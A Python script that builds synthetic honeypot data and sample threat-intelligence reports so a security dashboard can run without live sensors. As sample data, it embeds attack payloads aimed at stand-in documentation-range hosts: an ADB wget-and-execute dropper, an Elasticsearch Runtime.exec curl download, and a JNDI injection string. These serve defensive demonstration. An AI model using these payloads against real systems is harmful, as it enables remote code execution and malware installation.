# Creates fake demo data so the dashboard can run without T-Pot,
# Elasticsearch or any API keys.
#
# It writes the same files the real pipeline makes:
#   - 04_tpot_30days_final_labeled.parquet
#   - FINAL_tpot_30days_kvkk_compliant.parquet
#   - 10_ip_risk_scores.parquet
#   - threat_intel.db (with ready-made sample reports, no API calls)
#
# All IPs are fake documentation addresses (192.0.2.x, 198.51.100.x, 203.0.113.x).
# The random seed is fixed, so every run gives the same data.
#
# If real data is already there, the script stops. Use --force to move the
# real files into real_data_backup/ first (they are never deleted).
#
# Usage:
#     python generate_demo_data.py
#     python generate_demo_data.py --force
import argparse
import importlib.util
import ipaddress
import os
import re
import shutil
import sqlite3
import sys
from datetime import datetime

import numpy as np
import pandas as pd

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LABELED_FILE = os.path.join(BASE_DIR, "04_tpot_30days_final_labeled.parquet")
FINAL_FILE = os.path.join(BASE_DIR, "FINAL_tpot_30days_kvkk_compliant.parquet")
RISK_FILE = os.path.join(BASE_DIR, "10_ip_risk_scores.parquet")
DB_FILE = os.path.join(BASE_DIR, "threat_intel.db")
OUTPUTS = [LABELED_FILE, FINAL_FILE, RISK_FILE, DB_FILE]
BACKUP_DIR = os.path.join(BASE_DIR, "real_data_backup")

SEED = 5737
N_EVENTS = 24000
WINDOW_START = pd.Timestamp("2026-09-01T00:00:00Z")
WINDOW_DAYS = 30
REPORT_DATE = "2026-10-01 09:00:00"  # fixed, so reruns are identical

DEMO_NETWORKS = [ipaddress.ip_network(n) for n in ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")]
DEMO_MARKER = "Demo report"
HONEYPOT_IP = "192.0.2.200"  # the sensor's own (documentation-range) address

# Specific actors with hand-designed behaviour (all RFC 5737 addresses)
ANOMALY_IP = "203.0.113.66"   # Elasticsearch script injection -> ML anomaly
DROPPER_IP = "198.51.100.77"  # ADB malware dropper
DROPPER_HOST = "198.51.100.150"

COLUMNS = [
    "@timestamp", "type", "src_ip", "src_ip_valid", "src_ip_raw", "src_port",
    "dest_ip", "dest_port", "url", "payload", "downloads", "Attack_Type",
]

WEB_PATHS = [
    "/xmlrpc.php", "/wp-login.php", "/.env", "/.git/config", "/admin/config.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/?XDEBUG_SESSION_START=phpstorm",
    "/boaform/admin/formLogin", "/HNAP1/", "/cgi-bin/luci/;stok=/locale",
]

DROPPER_PAYLOAD = (
    f"cd /data/local/tmp/; busybox wget http://{DROPPER_HOST}/bins/arm7 -O x; "
    "chmod 777 x; ./x android.adb"
)
ANOMALY_PAYLOAD = (
    '{"size":1,"script_fields":{"exp":{"script":"java.lang.Math.class.forName('
    '\\"java.lang.Runtime\\").getRuntime().exec(\\"curl -s http://'
    + ANOMALY_IP
    + '/es.sh -o /tmp/es.sh\\").getText()"}},"query":{"match_all":{}}}'
)
JNDI_RAW = "${jndi:ldap://198.51.100.23:1389/Basic/Command/Base64/d2dldA==}"


# Reuse the real pipeline code instead of duplicating it
def _load_pipeline_module(name, filename):
    spec = importlib.util.spec_from_file_location(name, os.path.join(BASE_DIR, filename))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)  # both files guard their work with __main__
    return module


kvkk = _load_pipeline_module("kvkk_compliance", "07_kvkk_compliance.py")
risk_scoring = _load_pipeline_module("risk_scoring", "10_risk_scoring.py")

DEMO_MASKED = {kvkk.mask_ip_address(str(net.network_address)) for net in DEMO_NETWORKS} | {"***.***.***.***"}


# Overwrite protection
def _is_demo_value(value):
    if value in ("INVALID", "") or value in DEMO_MASKED:
        return True
    try:
        return any(ipaddress.ip_address(value) in net for net in DEMO_NETWORKS)
    except ValueError:
        return False


def holds_only_demo_data(path):
    # True only if every IP in the file is fake demo data.
    # If the file can't be read, treat it as real data to be safe.
    try:
        if path.endswith(".parquet"):
            values = pd.read_parquet(path, columns=["src_ip"])["src_ip"].dropna().unique()
            return all(_is_demo_value(v) for v in values)

        conn = sqlite3.connect(path)
        try:
            tables = {r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")}
            if tables - {"network_threat_logs", "ai_intelligence_reports", "ip_risk_reports", "sqlite_sequence"}:
                return False
            if "network_threat_logs" in tables:
                ips = [r[0] for r in conn.execute("SELECT DISTINCT src_ip FROM network_threat_logs")]
                if not all(ip is None or _is_demo_value(ip) for ip in ips):
                    return False
            if "ip_risk_reports" in tables:
                ips = [r[0] for r in conn.execute("SELECT masked_ip FROM ip_risk_reports")]
                if not all(_is_demo_value(ip) for ip in ips):
                    return False
            if "ai_intelligence_reports" in tables:
                contents = [r[0] for r in conn.execute("SELECT report_content FROM ai_intelligence_reports")]
                if not all(DEMO_MARKER in (c or "") for c in contents):
                    return False
            return True
        finally:
            conn.close()
    except Exception:
        return False


def protect_existing_outputs(force):
    real = [p for p in OUTPUTS if os.path.exists(p) and not holds_only_demo_data(p)]
    if not real:
        return True

    print("WARNING: these files already contain non-demo (possibly real) pipeline output:")
    for p in real:
        print(f"  - {os.path.basename(p)}")
    if not force:
        print("\nNothing was changed. Re-run with --force to move them to "
              "real_data_backup/<timestamp>/ and generate demo data instead.")
        return False

    target = os.path.join(BACKUP_DIR, datetime.now().strftime("%Y%m%d-%H%M%S"))
    os.makedirs(target, exist_ok=True)
    for p in real:
        shutil.move(p, os.path.join(target, os.path.basename(p)))
    print(f"--force: moved {len(real)} file(s) to {os.path.relpath(target, BASE_DIR)}")
    return True


# Synthetic events (shape of 04_tpot_30days_final_labeled.parquet)
def build_ip_pool(prefix, hosts, rng):
    # A few IPs are very active, most are quiet.
    ips = [f"{prefix}.{h}" for h in hosts]
    order = rng.permutation(len(ips))
    weights = 1.0 / np.arange(1, len(ips) + 1) ** 1.15
    return [ips[i] for i in order], weights / weights.sum()


def pick_ips(n, pool_mix, pools, rng):
    keys = list(pool_mix)
    chosen = rng.choice(len(keys), size=n, p=[pool_mix[k] for k in keys])
    out = np.empty(n, dtype=object)
    for i, key in enumerate(keys):
        idx = np.where(chosen == i)[0]
        ips, weights = pools[key]
        out[idx] = [ips[j] for j in rng.choice(len(ips), size=len(idx), p=weights)]
    return out


def pick(options, n, rng):
    values = list(options)
    return np.array(values)[rng.choice(len(values), size=n, p=list(options.values()))]


def random_timestamps(n, rng):
    days = np.arange(WINDOW_DAYS)
    weights = 1 + 0.25 * np.sin(days / WINDOW_DAYS * 2 * np.pi * 4) + rng.uniform(0, 0.3, WINDOW_DAYS)
    weights[[6, 19]] *= 2.3  # two campaign spikes
    weights /= weights.sum()
    ts = (
        WINDOW_START
        + pd.to_timedelta(rng.choice(days, size=n, p=weights), unit="D")
        + pd.to_timedelta(rng.integers(0, 86400, n), unit="s")
        + pd.to_timedelta(rng.integers(0, 1000, n), unit="ms")
    )
    return pd.Series(ts).dt.strftime("%Y-%m-%dT%H:%M:%S.%f").str[:-3] + "Z"


def generate_events(rng):
    pools = {
        "a": build_ip_pool("203.0.113", range(10, 40), rng),
        "b": build_ip_pool("198.51.100", range(20, 50), rng),
        "c": build_ip_pool("192.0.2", range(30, 60), rng),
    }
    # (type, Attack_Type, share, port distribution or None, IP pool mix, downloads)
    profiles = [
        ("Dionaea", "Database_ERP_BruteForce", 0.46, {1433: 0.90, 3306: 0.06, 5432: 0.04}, {"a": 0.8, "b": 0.2}, "nan"),
        ("Fatt", "Encrypted_Traffic_Profile", 0.30, {443: 0.70, 8443: 0.15, 22: 0.15}, {"b": 0.7, "c": 0.3}, "nan"),
        ("Honeytrap", "Uncategorized", 0.12,
         {23: 0.30, 2323: 0.15, 8080: 0.20, 6379: 0.10, 5555: 0.10, 81: 0.15}, {"c": 0.7, "a": 0.3}, "{}"),
        ("NGINX", "Web_Exploit_Attempt", 0.08, None, {"b": 0.5, "c": 0.5}, "nan"),
        ("Adbhoney", "Uncategorized", 0.007, {5555: 1.0}, {"c": 1.0}, "nan"),
        ("Ciscoasa", "Uncategorized", 0.007, {443: 1.0}, {"c": 1.0}, "nan"),
        ("Wordpot", "Uncategorized", 0.006, {80: 1.0}, {"b": 1.0}, "nan"),
        ("Tanner", "Uncategorized", 0.005, {80: 1.0}, {"c": 1.0}, "nan"),
        ("Redishoneypot", "Uncategorized", 0.005, {6379: 1.0}, {"a": 1.0}, "nan"),
        ("Heralding", "Uncategorized", 0.004, {21: 0.6, 110: 0.4}, {"c": 1.0}, "nan"),
        ("ConPot", "Uncategorized", 0.003, {502: 0.7, 102: 0.3}, {"c": 1.0}, "nan"),
        ("ElasticPot", "Uncategorized", 0.003, {9200: 1.0}, {"a": 1.0}, "nan"),
    ]

    frames = []
    for sensor, attack, share, ports, pool_mix, downloads in profiles:
        n = int(round(N_EVENTS * share))
        is_web = ports is None
        url = np.full(n, None, dtype=object)
        if is_web:
            with_url = rng.random(n) < 0.15
            url[with_url] = [
                f"http://{HONEYPOT_IP}:80{WEB_PATHS[i]}" for i in rng.integers(0, len(WEB_PATHS), with_url.sum())
            ]
        frames.append(pd.DataFrame({
            "type": sensor,
            "src_ip": pick_ips(n, pool_mix, pools, rng),
            "src_port": rng.integers(1024, 65536, n).astype(float),
            "dest_ip": None if is_web else HONEYPOT_IP,
            "dest_port": np.nan if is_web else pick(ports, n, rng).astype(float),
            "url": url,
            "payload": None,
            "downloads": downloads,
            "Attack_Type": attack,
        }))

    special = [
        # ADB malware dropper (03 labels wget-style droppers as Malware_Dropper)
        *({"type": "Adbhoney", "src_ip": DROPPER_IP, "dest_port": 5555.0, "payload": DROPPER_PAYLOAD,
           "downloads": "{}", "Attack_Type": "Malware_Dropper"} for _ in range(12)),
        # The outlier stage 04's K-Means flags: long injected payload on a rare port
        *({"type": "ElasticPot", "src_ip": ANOMALY_IP, "dest_port": 9200.0, "payload": ANOMALY_PAYLOAD,
           "downloads": "nan", "Attack_Type": "ML_Detected_Anomaly"} for _ in range(3)),
    ]
    special = pd.DataFrame(special)
    special["src_port"] = rng.integers(1024, 65536, len(special)).astype(float)
    special["dest_ip"] = HONEYPOT_IP
    special["url"] = None
    frames.append(special)

    # Invalid src_ip rows, exactly as stage 02 flags them (kept, not dropped)
    invalid_raw = [None, None, "", JNDI_RAW]
    frames.append(pd.DataFrame({
        "type": ["Honeytrap", "Honeytrap", "Honeytrap", "NGINX"],
        "src_ip": "INVALID",
        "src_ip_valid": False,
        "src_ip_raw": invalid_raw,
        "src_port": rng.integers(1024, 65536, 4).astype(float),
        "dest_ip": [HONEYPOT_IP, HONEYPOT_IP, HONEYPOT_IP, None],
        "dest_port": [23.0, 8080.0, 2323.0, np.nan],
        "url": None,
        "payload": None,
        "downloads": ["{}", "{}", "{}", "nan"],
        "Attack_Type": ["Uncategorized", "Uncategorized", "Uncategorized", "Web_Exploit_Attempt"],
    }))

    df = pd.concat(frames, ignore_index=True)
    # Only the invalid-src_ip frame sets these columns; every other row is valid
    df["src_ip_valid"] = df["src_ip_valid"].ne(False).astype(bool)
    df["src_ip_raw"] = df["src_ip_raw"].where(~df["src_ip_valid"], None)

    df.loc[rng.random(len(df)) < 0.0015, "src_port"] = np.nan  # a few events lack a source port
    df["@timestamp"] = random_timestamps(len(df), rng).values

    df = df[COLUMNS].sort_values("@timestamp", ascending=False).reset_index(drop=True)
    for col in ["@timestamp", "type", "src_ip", "src_ip_raw", "dest_ip", "url", "payload", "downloads", "Attack_Type"]:
        df[col] = df[col].astype(object).where(df[col].notna(), None)
    return df


# --------------------------------------------------------------------------
# Risk scores (shape of 10_ip_risk_scores.parquet)
# --------------------------------------------------------------------------
def generate_risk_scores(events, rng):
    abuse_ranges = {"203.0.113.": (55, 100), "198.51.100.": (15, 75), "192.0.2.": (0, 40)}
    fixed = {
        ANOMALY_IP: {"abuse": 92.0, "vt": np.nan, "ml": True},   # payload hash unknown to VirusTotal
        DROPPER_IP: {"abuse": 81.0, "vt": 64.4, "ml": False},    # 47 of 73 engines flag the dropper
        "INVALID": {"abuse": np.nan, "vt": np.nan, "ml": False},  # AbuseIPDB rejects a non-IP
    }

    rows = []
    for ip in events["src_ip"].drop_duplicates():  # first-seen order, like stage 10
        if ip in fixed:
            abuse, vt, ml = fixed[ip]["abuse"], fixed[ip]["vt"], fixed[ip]["ml"]
        else:
            low, high = next(r for prefix, r in abuse_ranges.items() if ip.startswith(prefix))
            abuse, vt, ml = float(rng.integers(low, high + 1)), np.nan, False
        rows.append({
            "src_ip": ip,
            "Risk_Score": risk_scoring.combine_scores(
                None if np.isnan(abuse) else abuse,
                None if np.isnan(vt) else vt,
                100.0 if ml else 0.0,
            ),
            "abuse_score": abuse,
            "virustotal_score": vt,
            "is_ml_anomaly": ml,
        })
    return pd.DataFrame(rows).sort_values("Risk_Score", ascending=False).reset_index(drop=True)


# Pre-written reports (static text - no API calls)
_MASKED_IP = re.compile(r"\b(\d{1,3}\.\d{1,3})\.\*\*\*\.\*\*\*")


def mask_for_markdown(text):
    # Masks IPs like the dashboard does, and escapes the * so markdown shows them correctly.
    return _MASKED_IP.sub(r"\1.\\*\\*\\*.\\*\\*\\*", kvkk.anonymize_report_content(text))


def _fmt(value, suffix=""):
    return "not available" if pd.isna(value) else f"{value:.1f}{suffix}"


def _ip_facts(events, risk_row):
    ev = events[events["src_ip"] == risk_row["src_ip"]]
    ports = ev["dest_port"].dropna()
    return {
        "ip": risk_row["src_ip"],
        "events": len(ev),
        "sensor": ev["type"].mode().iat[0],
        "port": int(ports.mode().iat[0]) if len(ports) else None,
        "first": ev["@timestamp"].min()[:10],
        "last": ev["@timestamp"].max()[:10],
        "risk": risk_row["Risk_Score"],
        "abuse": risk_row["abuse_score"],
        "vt": risk_row["virustotal_score"],
        "ml": bool(risk_row["is_ml_anomaly"]),
    }


def _report_header(f):
    return f"""> *{DEMO_MARKER}: a pre-written sample for demonstration, not generated by an LLM.*

## Threat Intelligence Report: {f['ip']}

| Item | Value |
|------|-------|
| **Source IP** | {f['ip']} |
| **Observed** | {f['events']} events, {f['first']} to {f['last']} |
| **Primary sensor / port** | {f['sensor']} / {f['port'] if f['port'] else 'n/a'} |
| **Risk score** | {f['risk']:.1f}/100 |
| **AbuseIPDB confidence** | {_fmt(f['abuse'], '%')} |
| **VirusTotal detection** | {_fmt(f['vt'], '%')} |
| **ML anomaly flag** | {'Yes' if f['ml'] else 'No'} |
"""


def drilldown_report(kind, f):
    if kind == "anomaly":
        body = f"""
### EXECUTIVE SUMMARY
{f['ip']} sent an Elasticsearch `script_fields` query to the ElasticPot sensor on port 9200 that tries to reach `java.lang.Runtime.exec()` and download a shell script with `curl`. This is a remote code execution attempt against unauthenticated, script-enabled Elasticsearch clusters. The unsupervised model isolated these events as an outlier (long payload on a rarely targeted port), and AbuseIPDB reports the address as highly abusive.

### TACTICS, TECHNIQUES & PROCEDURES (TTPs)
| MITRE ATT&CK | Technique | Evidence |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Script injection in an Elasticsearch search request |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | `Runtime.exec()` invoking `curl` |
| T1105 | Ingress Tool Transfer | Second-stage `es.sh` downloaded to `/tmp` |

### TECHNICAL ANALYSIS
The payload abuses dynamic scripting (the CVE-2014-3120 / CVE-2015-1427 family) to reflect into `java.lang.Runtime`. The downloaded script is not available, but this pattern typically deploys a cryptominer or adds the host to a botnet. All three attempts used an identical payload, which points to automated exploitation rather than a hands-on operator.

### MITIGATION STRATEGIES
1. Never expose Elasticsearch (9200/9300) to the internet; bind it to internal interfaces.
2. Keep dynamic scripting disabled and run supported, patched versions with authentication enabled.
3. Block {f['ip']} at the perimeter and alert on outbound `curl`/`wget` from data-tier hosts.
"""
    elif kind == "dropper":
        body = f"""
### EXECUTIVE SUMMARY
{f['ip']} used the open Android Debug Bridge (ADB, port 5555) emulated by the Adbhoney sensor to download and run an ARM binary (`busybox wget http://{DROPPER_HOST}/bins/arm7`). This is a classic IoT botnet propagation chain. VirusTotal flags the dropper payload in {_fmt(f['vt'], '%')} of engines.

### TACTICS, TECHNIQUES & PROCEDURES (TTPs)
| MITRE ATT&CK | Technique | Evidence |
|---|---|---|
| T1133 | External Remote Services | Unauthenticated ADB shell on 5555 |
| T1105 | Ingress Tool Transfer | `wget` of an architecture-specific binary |
| T1222 | File and Directory Permissions Modification | `chmod 777` before execution |

### TECHNICAL ANALYSIS
The command sequence (`cd /data/local/tmp`, `wget`, `chmod 777`, execute with an `android.adb` tag) matches Mirai-derived loaders that self-identify their infection vector. The binary is fetched from a separate staging host, a common way to separate the scanner from the distribution infrastructure.

### MITIGATION STRATEGIES
1. Make sure no device exposes ADB over TCP; disable `adb tcpip` on production and IoT devices.
2. Block {f['ip']} and the staging host {DROPPER_HOST} at the perimeter.
3. Add network detections for `busybox wget` / `tftp` command chains toward IoT segments.
"""
    else:
        body = f"""
### EXECUTIVE SUMMARY
{f['ip']} shows broad, low-sophistication scanning across the honeypot, mostly against {f['sensor']} on port {f['port']}. There is no exploitation payload and no malware delivery; AbuseIPDB reports moderate prior abuse. The activity fits an opportunistic scanner building target lists.

### TACTICS, TECHNIQUES & PROCEDURES (TTPs)
| MITRE ATT&CK | Technique | Evidence |
|---|---|---|
| T1595.001 | Active Scanning: Scanning IP Blocks | Repeated connection attempts across the sensor range |
| T1046 | Network Service Discovery | Probing of commonly exposed service ports |

### TECHNICAL ANALYSIS
Connections are short-lived and carry no application payload, which is typical of SYN/banner-grab scanning. The timing spread over the observation window points to a scheduled scanner rather than a targeted campaign.

### MITIGATION STRATEGIES
1. Make sure only required services are internet-facing; close the probed ports where unused.
2. Rate-limit or temporarily block persistent scanners such as {f['ip']}.
3. Keep monitoring: scanners often precede exploitation attempts from related infrastructure.
"""
    return mask_for_markdown(_report_header(f) + body)


def executive_report(events):
    total = len(events)
    dist = events["Attack_Type"].value_counts()
    share = lambda k: 100 * dist.get(k, 0) / total
    ports = events["dest_port"].dropna().astype(int).value_counts().head(5)
    sensors = events["type"].value_counts().head(3)
    port_lines = "\n".join(f"- Port {p}: {c:,} events" for p, c in ports.items())
    sensor_lines = ", ".join(f"{s} ({c:,})" for s, c in sensors.items())
    return f"""> *{DEMO_MARKER}: a pre-written sample for demonstration, not generated by an LLM.*

## EXECUTIVE OVERVIEW
Over the 30-day window the honeypot network recorded **{total:,} malicious events**. The landscape is dominated by automated credential attacks against database services ({share('Database_ERP_BruteForce'):.1f}% of all events), followed by encrypted-channel reconnaissance ({share('Encrypted_Traffic_Profile'):.1f}%). Activity was steady, with two campaign spikes, and no single actor accounts for a majority of the traffic, so this is broad, commodity attack pressure rather than a targeted campaign.

## THREAT LANDSCAPE ANALYSIS
- **Database / ERP brute force:** the largest category. Attackers repeatedly try default and weak credentials against MSSQL, the backend of many ERP systems, aiming at financial and operational data.
- **Encrypted traffic profiling:** TLS and SSH fingerprinting at scale, typically used to inventory exposed services and weak configurations before exploitation.
- **Web exploit attempts ({share('Web_Exploit_Attempt'):.1f}%):** probes for WordPress, PHPUnit, exposed `.env`/`.git` files and router admin panels.
- **Malware delivery and anomalies:** a small number of high-severity events: an ADB malware dropper and an Elasticsearch remote code execution attempt isolated by the ML model. These are low in volume but the most dangerous activity in the period.
- **Uncategorized ({share('Uncategorized'):.1f}%):** mostly port scanning against Telnet, Redis and industrial protocols, useful as an early-warning signal.

## TARGETING TRENDS
{port_lines}

The most active sensors were {sensor_lines}. Database ports dominate, followed by encrypted services: attackers prioritize data stores and remote-access surfaces over application-level vulnerabilities.

## STRATEGIC RECOMMENDATIONS
1. **Remove database services from the internet.** Restrict MSSQL/MySQL/PostgreSQL to internal networks or VPN, enforce strong unique credentials and lockout policies, and alert on authentication bursts.
2. **Harden remote-access and data-tier services.** Disable ADB over TCP, keep Elasticsearch internal with authentication and scripting disabled, and patch internet-facing appliances on a fixed cycle.
3. **Operationalize the honeypot intelligence.** Feed high-risk sources (risk score 75 or above) into perimeter blocklists automatically and review the ML-flagged anomalies weekly, as they surface the rare, high-impact attacks hidden in commodity noise.
"""


def anomaly_technical_report(events, risk):
    row = risk[risk["src_ip"] == ANOMALY_IP].iloc[0]
    return drilldown_report("anomaly", _ip_facts(events, row))


# Writing outputs
def write_database(final_df, events, risk):
    if os.path.exists(DB_FILE):
        os.remove(DB_FILE)  # only reached for demo-only data or after --force backup
    conn = sqlite3.connect(DB_FILE)
    try:
        final_df.to_sql("network_threat_logs", conn, if_exists="replace", index=False)  # as stage 08

        conn.execute("""
            CREATE TABLE IF NOT EXISTS ai_intelligence_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                report_type TEXT,
                report_content TEXT,
                creation_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.executemany(
            "INSERT INTO ai_intelligence_reports (report_type, report_content, creation_date) VALUES (?, ?, ?)",
            [
                ("Anomaly Technical Report", anomaly_technical_report(events, risk), REPORT_DATE),
                ("Executive CISO Report", executive_report(events), REPORT_DATE),
            ],
        )

        conn.execute("""
            CREATE TABLE IF NOT EXISTS ip_risk_reports (
                masked_ip TEXT PRIMARY KEY,
                risk_score REAL,
                report_content TEXT,
                creation_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # One cached drill-down report per masked block, describing the block's
        # worst-case IP - the same IP the dashboard picks for that block.
        risk = risk.assign(masked_ip=risk["src_ip"].map(kvkk.mask_ip_address))
        kinds = {ANOMALY_IP: "anomaly", DROPPER_IP: "dropper"}
        rows = []
        for masked_ip, block in risk[risk["masked_ip"] != "***.***.***.***"].groupby("masked_ip", sort=True):
            worst = block.sort_values("Risk_Score", ascending=False).iloc[0]
            text = drilldown_report(kinds.get(worst["src_ip"], "scanner"), _ip_facts(events, worst))
            rows.append((masked_ip, float(worst["Risk_Score"]), text, REPORT_DATE))
        conn.executemany(
            "INSERT INTO ip_risk_reports (masked_ip, risk_score, report_content, creation_date) VALUES (?, ?, ?, ?)",
            rows,
        )
        conn.commit()
        return len(rows)
    finally:
        conn.close()


def main():
    parser = argparse.ArgumentParser(description="Generate synthetic demo data for the dashboard.")
    parser.add_argument("--force", action="store_true",
                        help="move existing non-demo outputs to real_data_backup/ and generate anyway")
    args = parser.parse_args()

    if not protect_existing_outputs(args.force):
        return 1

    rng = np.random.default_rng(SEED)
    print("1. Generating synthetic events (RFC 5737 addresses only)...")
    events = generate_events(rng)
    events.to_parquet(LABELED_FILE, engine="pyarrow", index=False)

    print("2. Masking with stage 07's own compliance code...")
    kvkk.enforce_dataset_compliance(LABELED_FILE, FINAL_FILE)
    final_df = pd.read_parquet(FINAL_FILE)

    print("3. Scoring IPs with stage 10's own formula...")
    risk = generate_risk_scores(events, rng)
    risk.to_parquet(RISK_FILE, engine="pyarrow", index=False)

    print("4. Writing threat_intel.db with pre-written reports...")
    n_reports = write_database(final_df, events, risk)

    print("\nDemo data ready:")
    print(f"  events: {len(events):,} | attacker IPs: {events['src_ip'].nunique()} "
          f"| invalid src_ip rows: {int((~events['src_ip_valid']).sum())}")
    print(f"  risk scores: {len(risk)} IPs | drill-down reports: {n_reports} | executive report: 1")
    print("Start the dashboard: streamlit run dashboard.py  (or: docker compose up)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
